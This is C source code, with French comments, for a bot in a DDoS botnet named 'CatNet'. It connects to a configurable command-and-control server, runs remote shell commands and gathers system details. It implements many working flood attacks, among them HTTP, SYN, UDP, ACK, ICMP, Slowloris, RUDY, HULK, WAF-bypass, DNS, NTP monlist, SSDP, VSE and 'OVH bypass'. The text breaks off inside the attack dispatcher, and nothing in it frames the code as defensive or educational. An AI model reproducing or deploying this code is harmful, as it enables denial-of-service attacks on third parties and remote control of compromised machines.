/*
 * Bot optimisé pour le botnet CatNet
 * Capacités améliorées d'infection et d'attaque DDoS
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <netinet/udp.h>
 #include <netdb.h>
 #include <sys/types.h>
 #include <fcntl.h>
 #include <errno.h>
 #include <time.h>
 #include <signal.h>
 #include <ctype.h>
 #include <dirent.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
 
 #ifdef __linux__
 #include <sys/prctl.h>
 #include <linux/limits.h>
 #endif
 
 // Pour les attaques avancées
 #ifdef __MIPS__
 #define ARCH "MIPS"
 #elif defined(__ARM__)
 #define ARCH "ARM"
 #elif defined(__x86_64__)
 #define ARCH "x86_64"
 #elif defined(__i386__)
 #define ARCH "x86"
 #elif defined(__PPC__)
 #define ARCH "PowerPC"
 #elif defined(__SPARC__)
 #define ARCH "SPARC"
 #else
 #define ARCH "Unknown"
 #endif
 
 // Déclarations des fonctions
 void ddos_attack(int c2_socket, char* target, int port, int duration, char* method);
 void http_flood(char* target, int port, int duration);
 void syn_flood(char* target, int port, int duration);
 void udp_flood(char* target, int port, int duration);
 void tcp_flood(char* target, int port, int duration);
 void ack_flood(char* target, int port, int duration);
 void icmp_flood(char* target, int port, int duration);
 void slowloris_attack(char* target, int port, int duration);
 void rudy_attack(char* target, int port, int duration);
 void arme_attack(char* target, int port, int duration);
 void hulk_attack(char* target, int port, int duration);
 void bypass_attack(char* target, int port, int duration);
 void dns_flood(char* target, int duration);
 void vse_flood(char* target, int port, int duration);
 void ntp_flood(char* target, int duration);
 void ssdp_flood(char* target, int duration);
 void ovh_bypass(char* target, int port, int duration);
 void std_flood(char* target, int port, int duration);
 void persist(void);
 void generate_device_id(void);
 void auto_propagate(void);
 void scan_network(int c2_socket, char* subnet);
 char* execute_command(char* command);
 char* collect_system_info(void);
 void connect_to_c2(void);
 void daemonize(void);
 
 // C2_SERVER is set at compile time: gcc ... -DC2_SERVER=\"x.x.x.x\"
 #ifndef C2_SERVER
 #define C2_SERVER ""
 #endif
 #define C2_PORT 1337
 #define BUFFER_SIZE 1024
 #define CMD_SIZE 512
 #define DEVICE_ID_SIZE 64
 
 // Identifiant unique pour ce bot
 char device_id[DEVICE_ID_SIZE] = {0};
 
 // User-Agents pour les attaques HTTP
 const char* user_agents[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/89.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
 };
 
 // Fonction pour exécuter une commande shell et retourner la sortie
 char* execute_command(char* command) {
     FILE* fp;
     size_t output_size = BUFFER_SIZE * 10;
     char* output = malloc(output_size);
     char buffer[BUFFER_SIZE];
     
     if (!output) return NULL;
     memset(output, 0, output_size);
     
     fp = popen(command, "r");
     if (fp == NULL) {
         free(output);
         return NULL;
     }
     
     while (fgets(buffer, sizeof(buffer), fp) != NULL) {
         size_t current_len = strlen(output);
         size_t buffer_len = strlen(buffer);
         if (current_len + buffer_len < output_size - 1) {
             strncat(output, buffer, output_size - current_len - 1);
         } else {
             break; // Éviter le débordement de tampon
         }
     }
     
     pclose(fp);
     return output;
 }
 
 // Fonction pour collecter les informations système
 char* collect_system_info(void) {
     size_t info_size = BUFFER_SIZE * 10;
     char* info = malloc(info_size);
     char* cmd_output;
     
     if (!info) return NULL;
     memset(info, 0, info_size);
     
     // Obtenir le hostname
     char hostname[256] = {0};
     gethostname(hostname, sizeof(hostname));
     snprintf(info, info_size, "Hostname: %s\nArch: %s\n", hostname, ARCH);
     
     // Obtenir les informations sur le système d'exploitation
     cmd_output = execute_command("uname -a");
     if (cmd_output) {
         strncat(info, "OS: ", info_size - strlen(info) - 1);
         strncat(info, cmd_output, info_size - strlen(info) - 1);
         free(cmd_output);
     }
     
     // Obtenir les informations sur le processeur
     cmd_output = execute_command("cat /proc/cpuinfo | grep 'model name' | head -n1");
     if (cmd_output) {
         strncat(info, "CPU: ", info_size - strlen(info) - 1);
         strncat(info, cmd_output, info_size - strlen(info) - 1);
         free(cmd_output);
     }
     
     // Obtenir les informations sur la mémoire
     cmd_output = execute_command("free -m | grep Mem");
     if (cmd_output) {
         strncat(info, "Memory: ", info_size - strlen(info) - 1);
         strncat(info, cmd_output, info_size - strlen(info) - 1);
         free(cmd_output);
     }
     
     // Obtenir les informations réseau
     cmd_output = execute_command("ifconfig | grep inet");
     if (cmd_output) {
         strncat(info, cmd_output, info_size - strlen(info) - 1);
         free(cmd_output);
     }
     
     return info;
 }
 
 // Fonction pour configurer un socket avec un timeout
 int create_socket_with_timeout(int type, int timeout_sec) {
     int sock = socket(AF_INET, type, 0);
     if (sock == -1) return -1;
     
     struct timeval tv;
     tv.tv_sec = timeout_sec;
     tv.tv_usec = 0;
     
     if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv)) < 0) {
         close(sock);
         return -1;
     }
     if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&tv, sizeof(tv)) < 0) {
         close(sock);
         return -1;
     }
     
     return sock;
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation HTTP
 void http_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     char request[BUFFER_SIZE];
     char* paths[] = {
         "/", "/index.html", "/api/", "/login", "/admin",
         "/search", "/products", "/cart", "/checkout", "/contact"
     };
     int num_paths = sizeof(paths) / sizeof(paths[0]);
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     while (time(NULL) - start_time < duration) {
         sock = create_socket_with_timeout(SOCK_STREAM, 1);
         if (sock != -1) {
             if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                 const char* user_agent = user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))];
                 char* path = paths[rand() % num_paths];
                 
                 snprintf(request, BUFFER_SIZE,
                     "GET %s?%d HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Connection: close\r\n\r\n",
                     path, rand(), target, user_agent);
                 
                 send(sock, request, strlen(request), 0);
             }
             close(sock);
         }
         usleep(10000);
     }
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation SYN
 void syn_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     #ifdef __linux__
     // Sur Linux, on peut utiliser des raw sockets pour le SYN flood
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock != -1) {
         // Définir les options du socket
         int one = 1;
         if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
             close(sock);
         } else {
             // Créer un paquet SYN basique
             char syn_packet[60]; // En-tête IP (20) + En-tête TCP (40)
             memset(syn_packet, 0, sizeof(syn_packet));
             
             // Remplir avec des données aléatoires pour simuler un paquet SYN
             for (int i = 0; i < sizeof(syn_packet); i++) {
                 syn_packet[i] = rand() % 256;
             }
             
             while (time(NULL) - start_time < duration) {
                 sendto(sock, syn_packet, sizeof(syn_packet), 0,
                        (struct sockaddr*)&target_addr, sizeof(target_addr));
                 usleep(1000);
             }
             close(sock);
         }
     }
     #else
     // Sur les autres systèmes, on simule un SYN flood avec des connexions partielles
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Rendre le socket non-bloquant
             int flags = fcntl(sock, F_GETFL, 0);
             fcntl(sock, F_SETFL, flags | O_NONBLOCK);
             
             // Initier la connexion mais ne pas la compléter
             connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
             
             // Ne pas fermer le socket pour garder la connexion semi-ouverte
             // mais ne pas dépasser le nombre maximum de descripteurs de fichiers
             // donc on le ferme après un court délai
             usleep(10000);
             close(sock);
         }
         usleep(1000);
     }
     #endif
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation UDP
 void udp_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     char attack_packet[4096]; // Taille raisonnable pour un paquet UDP
     int packet_size = sizeof(attack_packet);
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     // Remplir le paquet avec des données aléatoires une seule fois
     for (int i = 0; i < packet_size; i++) {
         attack_packet[i] = rand() % 256;
     }
     
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock != -1) {
         int flags = fcntl(sock, F_GETFL, 0);
         if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
         
         while (time(NULL) - start_time < duration) {
             for (int i = 0; i < 50; i++) {
                 // Varier légèrement le port pour contourner certains filtres simples
                 int target_port = port == 0 ? (rand() % 65535) : port;
                 target_addr.sin_port = htons(target_port);
                 sendto(sock, attack_packet, packet_size, 0,
                        (struct sockaddr*)&target_addr, sizeof(target_addr));
             }
             usleep(500);
         }
         close(sock);
     }
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation TCP
 void tcp_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             int flags = fcntl(sock, F_GETFL, 0);
             if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
             
             connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
             close(sock);
         }
         usleep(500);
     }
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation ACK
 void ack_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock != -1) {
         int one = 1;
         if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
             close(sock);
             return;
         }
         
         char packet[60];
         memset(packet, 0, sizeof(packet));
         
         while (time(NULL) - start_time < duration) {
             for (int i = 0; i < sizeof(packet); i++) {
                 packet[i] = rand() % 256;
             }
             
             sendto(sock, packet, sizeof(packet), 0,
                    (struct sockaddr*)&target_addr, sizeof(target_addr));
             usleep(500);
         }
         close(sock);
     }
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation ICMP (ping flood)
 void icmp_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(0); // ICMP doesn't use ports
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (sock != -1) {
         int one = 1;
         if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
             close(sock);
             goto fallback;
         }
         
         char packet[64];
         memset(packet, 0, sizeof(packet));
         
         while (time(NULL) - start_time < duration) {
             for (int i = 0; i < sizeof(packet); i++) {
                 packet[i] = rand() % 256;
             }
             
             sendto(sock, packet, sizeof(packet), 0,
                    (struct sockaddr*)&target_addr, sizeof(target_addr));
             usleep(500);
         }
         close(sock);
         return;
     }
 
 fallback:
     {
         char ping_cmd[256];
         snprintf(ping_cmd, sizeof(ping_cmd), "ping -c 1 -W 1 %s > /dev/null 2>&1 &", target);
         while (time(NULL) - start_time < duration) {
             system(ping_cmd);
             usleep(1000);
         }
     }
 }
 
 // Fonction pour exécuter une attaque Slowloris
 void slowloris_attack(char* target, int port, int duration) {
     int max_sockets = 1000; // Nombre maximum de connexions simultanées
     int *sockets = (int*)malloc(max_sockets * sizeof(int));
     int active_sockets = 0;
     time_t start_time = time(NULL);
     struct sockaddr_in target_addr;
     
     if (!sockets) return; // Échec d'allocation mémoire
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     // Préparer l'en-tête de la requête HTTP partielle
     char partial_header[BUFFER_SIZE];
     snprintf(partial_header, BUFFER_SIZE,
         "GET / HTTP/1.1\r\n"
         "Host: %s\r\n"
         "User-Agent: %s\r\n"
         "Content-Length: 42\r\n",
         target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))]);
     
     // Boucle d'attaque pendant la durée spécifiée
     while (time(NULL) - start_time < duration) {
         // Ouvrir de nouvelles connexions si nécessaire
         while (active_sockets < max_sockets) {
             int sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock != -1) {
                 // Rendre le socket non-bloquant
                 int flags = fcntl(sock, F_GETFL, 0);
                 fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                 
                 // Tenter de se connecter
                 int res = connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
                 if (res >= 0 || errno == EINPROGRESS) {
                     // Envoyer l'en-tête partiel
                     send(sock, partial_header, strlen(partial_header), 0);
                     sockets[active_sockets++] = sock;
                 } else {
                     close(sock);
                 }
             }
             
             // Limiter le nombre de tentatives de connexion par itération
             if (active_sockets % 100 == 0) {
                 usleep(100000); // 100ms
             }
         }
         
         // Envoyer des données partielles pour maintenir les connexions ouvertes
         for (int i = 0; i < active_sockets; i++) {
             char keep_alive[2] = "X";
             send(sockets[i], keep_alive, 1, 0);
         }
         
         // Attendre avant d'envoyer plus de données
         sleep(10);
         
         // Nettoyer les sockets morts et les remplacer
         for (int i = 0; i < active_sockets; i++) {
             if (send(sockets[i], "", 0, 0) < 0) {
                 close(sockets[i]);
                 sockets[i] = sockets[--active_sockets];
                 i--;
             }
         }
     }
     
     // Nettoyer
     for (int i = 0; i < active_sockets; i++) {
         close(sockets[i]);
     }
     free(sockets);
 }
 
 // Fonction pour exécuter une attaque R-U-Dead-Yet (RUDY)
 void rudy_attack(char* target, int port, int duration) {
     int max_sockets = 150;
     int *sockets = (int*)malloc(max_sockets * sizeof(int));
     int active_sockets = 0;
     time_t start_time = time(NULL);
     struct sockaddr_in target_addr;
     
     if (!sockets) return; // Échec d'allocation mémoire
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     // Préparer l'en-tête de la requête POST
     char post_header[BUFFER_SIZE];
     snprintf(post_header, BUFFER_SIZE,
         "POST /login HTTP/1.1\r\n"
         "Host: %s\r\n"
         "User-Agent: %s\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
         "Content-Length: 1000000\r\n\r\n",
         target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))]);
     
     while (time(NULL) - start_time < duration) {
         // Maintenir plusieurs connexions
         while (active_sockets < max_sockets) {
             int sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock != -1) {
                 // Rendre le socket non-bloquant
                 int flags = fcntl(sock, F_GETFL, 0);
                 fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                 
                 if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0 ||
                     errno == EINPROGRESS) {
                     // Envoyer l'en-tête POST
                     send(sock, post_header, strlen(post_header), 0);
                     sockets[active_sockets++] = sock;
                 } else {
                     close(sock);
                 }
             }
         }
         
         // Envoyer des données très lentement pour chaque socket
         for (int i = 0; i < active_sockets; i++) {
             // Envoyer un seul caractère à la fois
             send(sockets[i], "A", 1, 0);
         }
         
         // Attendre avant d'envoyer le prochain caractère
         sleep(10);
         
         // Nettoyer les sockets morts
         for (int i = 0; i < active_sockets; i++) {
             if (send(sockets[i], "", 0, 0) < 0) {
                 close(sockets[i]);
                 sockets[i] = sockets[--active_sockets];
                 i--;
             }
         }
     }
     
     // Nettoyer
     for (int i = 0; i < active_sockets; i++) {
         close(sockets[i]);
     }
     free(sockets);
 }
 
 // Fonction pour exécuter une attaque ARME (Amplification de Réflexion de Mémoire)
 void arme_attack(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Liste de chemins connus pour générer de grandes réponses
     char *amplification_paths[] = {
         "/search?q=", "/api/all", "/products?limit=1000", "/users/list", "/data/export"
     };
     
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Initialiser la structure d'adresse cible
             memset(&target_addr, 0, sizeof(target_addr));
             target_addr.sin_family = AF_INET;
             target_addr.sin_port = htons(port);
             inet_pton(AF_INET, target, &target_addr.sin_addr);
             
             if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                 // Sélectionner un chemin d'amplification aléatoire
                 char *path = amplification_paths[rand() % (sizeof(amplification_paths) / sizeof(amplification_paths[0]))];
                 
                 // Construire une requête qui génère une grande réponse
                 char request[BUFFER_SIZE];
                 snprintf(request, BUFFER_SIZE,
                     "GET %s%d HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: */*\r\n\r\n",
                     path, rand(), target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))]);
                 
                 send(sock, request, strlen(request), 0);
             }
             close(sock);
         }
         usleep(5000);
     }
 }
 
 // Fonction pour exécuter une attaque HULK (HTTP Unbearable Load King)
 void hulk_attack(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Générer des chemins aléatoires pour contourner le cache
     char random_path[32];
     
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Initialiser la structure d'adresse cible
             memset(&target_addr, 0, sizeof(target_addr));
             target_addr.sin_family = AF_INET;
             target_addr.sin_port = htons(port);
             inet_pton(AF_INET, target, &target_addr.sin_addr);
             
             if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                 // Générer un chemin aléatoire pour contourner le cache
                 for (int i = 0; i < 10; i++) {
                     random_path[i] = 'a' + (rand() % 26);
                 }
                 random_path[10] = '?';
                 for (int i = 11; i < 30; i++) {
                     random_path[i] = 'a' + (rand() % 26);
                 }
                 random_path[30] = '=';
                 random_path[31] = '\0';
                 
                 // Construire une requête avec des en-têtes aléatoires
                 char request[BUFFER_SIZE];
                 snprintf(request, BUFFER_SIZE,
                     "GET /%s%d HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                     "Accept-Language: en-US,en;q=0.5\r\n"
                     "Accept-Encoding: gzip, deflate\r\n"
                     "DNT: 1\r\n"
                     "Connection: keep-alive\r\n"
                     "Cache-Control: no-cache\r\n"
                     "Pragma: no-cache\r\n\r\n",
                     random_path, rand(), target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))]);
                 
                 send(sock, request, strlen(request), 0);
             }
             close(sock);
         }
         usleep(1000);
     }
 }
 
 // Fonction pour exécuter une attaque avec contournement de protection WAF
 void bypass_attack(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Techniques de contournement WAF
     char *bypass_techniques[] = {
         "X-Forwarded-For: 127.0.0.1\r\n",
         "X-Originating-IP: 127.0.0.1\r\n",
         "X-Remote-IP: 127.0.0.1\r\n",
         "X-Remote-Addr: 127.0.0.1\r\n",
         "X-Client-IP: 127.0.0.1\r\n"
     };
     
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Initialiser la structure d'adresse cible
             memset(&target_addr, 0, sizeof(target_addr));
             target_addr.sin_family = AF_INET;
             target_addr.sin_port = htons(port);
             inet_pton(AF_INET, target, &target_addr.sin_addr);
             
             if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                 // Sélectionner une technique de contournement aléatoire
                 char *bypass = bypass_techniques[rand() % (sizeof(bypass_techniques) / sizeof(bypass_techniques[0]))];
                 
                 // Construire une requête avec des en-têtes de contournement
                 char request[BUFFER_SIZE];
                 snprintf(request, BUFFER_SIZE,
                     "GET /?%d HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "%s"
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                     "Accept-Language: en-US,en;q=0.5\r\n"
                     "Accept-Encoding: gzip, deflate\r\n"
                     "Connection: keep-alive\r\n"
                     "Cache-Control: no-cache\r\n\r\n",
                     rand(), target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))], bypass);
                 
                 send(sock, request, strlen(request), 0);
             }
             close(sock);
         }
         usleep(1000);
     }
 }
 
 // Fonction pour exécuter une attaque DNS Flood (Amplification simulée)
 void dns_flood(char* target, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     unsigned char dns_packet[] = {
         0xab, 0xcd, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x03, 0x77, 0x77, 0x77, 0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
         0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
     };
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(53);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock != -1) {
         int flags = fcntl(sock, F_GETFL, 0);
         if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
         
         while (time(NULL) - start_time < duration) {
             for (int i = 0; i < 100; i++) {
                 sendto(sock, dns_packet, sizeof(dns_packet), 0,
                        (struct sockaddr*)&target_addr, sizeof(target_addr));
             }
             usleep(500);
         }
         close(sock);
     }
 }
 
 // Fonction pour exécuter une attaque VSE (Valve Source Engine) Flood
 void vse_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     unsigned char vse_packet[] = {
         0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20,
         0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00
     };
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock != -1) {
         int flags = fcntl(sock, F_GETFL, 0);
         if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
         
         while (time(NULL) - start_time < duration) {
             for (int i = 0; i < 100; i++) {
                 sendto(sock, vse_packet, sizeof(vse_packet), 0,
                        (struct sockaddr*)&target_addr, sizeof(target_addr));
             }
             usleep(500);
         }
         close(sock);
     }
 }
 
 // Fonction pour exécuter une attaque NTP Reflection Flood
 void ntp_flood(char* target, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Paquet NTP monlist (très amplificateur)
     unsigned char ntp_packet[] = {
         0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00
     };
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(123);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock != -1) {
         int flags = fcntl(sock, F_GETFL, 0);
         if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
         
         while (time(NULL) - start_time < duration) {
             for (int i = 0; i < 100; i++) {
                 sendto(sock, ntp_packet, sizeof(ntp_packet), 0,
                        (struct sockaddr*)&target_addr, sizeof(target_addr));
             }
             usleep(500);
         }
         close(sock);
     }
 }
 
 // Fonction pour exécuter une attaque SSDP Amplification Flood
 void ssdp_flood(char* target, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     char *ssdp_packet = 
         "M-SEARCH * HTTP/1.1\r\n"
         "HOST: 239.255.255.250:1900\r\n"
         "MAN: \"ssdp:discover\"\r\n"
         "MX: 2\r\n"
         "ST: ssdp:all\r\n\r\n";
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(1900);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock != -1) {
         int flags = fcntl(sock, F_GETFL, 0);
         if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
         
         while (time(NULL) - start_time < duration) {
             for (int i = 0; i < 50; i++) {
                 sendto(sock, ssdp_packet, strlen(ssdp_packet), 0,
                        (struct sockaddr*)&target_addr, sizeof(target_addr));
             }
             usleep(1000);
         }
         close(sock);
     }
 }
 
 // Fonction pour exécuter une attaque OVH Bypass
 void ovh_bypass(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Utiliser des options TCP inhabituelles pour tenter de passer les filtres
             int mss = 512;
             setsockopt(sock, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
             
             int flags = fcntl(sock, F_GETFL, 0);
             if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
             
             connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
             
             // Envoyer des données aléatoires très vite
             char data[128];
             for(int i=0; i<128; i++) data[i] = rand() % 256;
             send(sock, data, 128, 0);
             
             close(sock);
         }
         usleep(500);
     }
 }
 
 // Fonction pour exécuter une attaque STD UDP Flood (Standard UDP)
 void std_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     char attack_packet[1024];
     
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
     
     for (int i = 0; i < 1024; i++) attack_packet[i] = rand() % 256;
     
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock != -1) {
         while (time(NULL) - start_time < duration) {
             sendto(sock, attack_packet, 1024, 0,
                    (struct sockaddr*)&target_addr, sizeof(target_addr));
             usleep(100);
         }
         close(sock);
     }
 }
 
 // Fonction principale pour exécuter une attaque DDoS
 void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
     // Envoyer un message de confirmation au serveur C2
     char msg[BUFFER_SIZE];
     snprintf(msg, BUFFER_SIZE, "ATTACK_STARTED|%s:%d|%s|%d", target, port, method, duration);
     send(c2_socket, msg, strlen(msg), 0);
     
     // Sélectionner la méthode d'attaque appropriée
     if (strcmp(method, "HTTP") == 0) {
         http_flood(target, port, duration);
     } else if (strcmp(method, "SYN") == 0) {
         syn_flood(target, port, duration);
     } else if (strcmp(method, "UDP") == 0) {
         udp_flood(target, port, duration);
     } else if (strcmp(method, "TCP") == 0) {
